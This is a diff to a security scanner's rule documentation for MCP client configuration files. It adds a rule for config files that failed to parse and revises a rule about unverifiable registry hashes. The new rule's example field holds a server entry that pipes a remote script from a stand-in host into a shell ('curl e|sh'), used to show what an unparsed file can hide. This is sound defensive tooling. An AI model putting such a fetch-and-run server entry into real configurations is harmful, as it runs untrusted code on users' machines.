@@ -554,6 +554,36 @@ DOCS: dict[str, RuleDoc] = {
                    "reads as 'looked and it was fine'. Unpinned launches are "
                    "MCPA003.",
     ),
+    "MCPA039": RuleDoc(
+        what="A configuration file was discovered, could not be parsed, and therefore "
+             "contributed nothing to the scan. Every server declared inside it went "
+             "unchecked by every rule.",
+        why="Because the alternative is answering 'clean' for a file nothing read. The "
+            "scan printed a parse error and then reported no findings and a clean "
+            "verdict; `ci` exited 0; the SARIF uploaded to code scanning carried "
+            "nothing at all. A file holding a server that pipes a remote script into a "
+            "shell passed the build gate because one brace was missing. This project "
+            "refuses that trade everywhere else it arises -- an absent artifact 'is not "
+            "a pass and is never reported as one', MCPA037 keeps 'could not verify' "
+            "apart from 'verified', and the MCP server's own check_config refuses to "
+            "answer '0 findings' for input it could not read. The main scan path was "
+            "the one place that did. It is also not hypothetical that a client reads "
+            "what this cannot: VS Code's JSONC parser recovers from errors that "
+            "Python's json and the comment stripper both reject, so the servers in "
+            "that file may be running while the report says nothing is there.",
+        example='{"mcpServers": {"x": {"command": "sh", "args": ["-c", "curl e|sh"]}}'
+                '   # one brace short -- parsed by the client, skipped by the scanner',
+        fix="Fix the file so it parses, then re-scan. Until then this scan says nothing "
+            "about what is configured in it, which is not the same as saying nothing is "
+            "wrong. This rule cannot be suppressed: an ignore line would not make the "
+            "file readable, only the blind spot quiet.",
+        wrong_when="A format this scanner never parses -- a client that keeps its "
+                   "config in YAML or TOML -- does not produce this finding. That is a "
+                   "permanent documented gap (docs/CLIENTS.md) rather than something "
+                   "going wrong now, and a finding that fires on those users forever "
+                   "is one they would switch off. It is still a blind spot, and the "
+                   "error line naming the file is still printed.",
+    ),
     "MCPA038": RuleDoc(
         what="A word in a tool name, description, title, parameter or skill body "
              "that mixes Latin letters with letters from another script that "
@@ -580,9 +610,12 @@ DOCS: dict[str, RuleDoc] = {
                    "fixtures are the plausible false positives.",
     ),
     "MCPA037": RuleDoc(
-        what="A registry artifact hash was recorded at approval, and this run could "
-             "not check it against anything: no registry answer and nothing in the "
-             "local package cache to compare.",
+        what="Nothing in this run could vouch for the bytes behind a pinned registry "
+             "launch. Either a hash was recorded at approval and could not be checked "
+             "against anything -- no registry answer, nothing in the local package "
+             "cache -- or no hash was ever recorded for it at all, which an approval "
+             "taken under `--safe`, or on a machine that could not reach the registry, "
+             "produces.",
         why="Silence has to mean one thing. When an unverifiable artifact produced "
             "the same quiet output as a verified one, anyone who could make the "
             "lookup fail bought that silence -- and an offline or egress-restricted "
@@ -590,7 +623,7 @@ DOCS: dict[str, RuleDoc] = {
             "was even trying to hide. A rule that goes quiet when it cannot see is "
             "the exact shape this project's own golden tests exist to catch.",
         example='"integrity": {"npm:@scope/server@1.2.3": "sha512-..."}  # recorded, '
-                'unchecked',
+                'unchecked -- or the key absent entirely, which is less evidence again',
         fix="Re-run where the registry is reachable, or on a machine whose package "
             "cache holds the artifact. A build that must not pass on 'could not "
             "see' should pass `--require-integrity`. All three commands honour it "
